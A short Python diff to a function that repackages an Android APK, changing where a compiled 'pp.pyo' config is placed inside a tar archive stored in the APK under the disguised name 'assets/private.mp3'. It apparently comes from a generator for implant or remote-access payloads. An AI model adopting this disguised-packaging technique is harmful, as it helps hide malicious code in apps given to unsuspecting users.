@@ -212,7 +212,7 @@ def get_edit_apk(path, conf):
 
         print "[+] packaging the apk ... (can take 10-20 seconds)"
         #updating the tar with the new config
-        updateTar(os.path.join(tempdir,"assets/private.mp3"), "service/pp.pyo", os.path.join(tempdir,"pp.pyo"))
+        updateTar(os.path.join(tempdir,"assets/private.mp3"), "pp.pyo", os.path.join(tempdir,"pp.pyo"))
         #repacking the tar in the apk
         with open(os.path.join(tempdir,"assets/private.mp3"), 'r') as t:
             updateZip(tempapk, "assets/private.mp3", t.read())
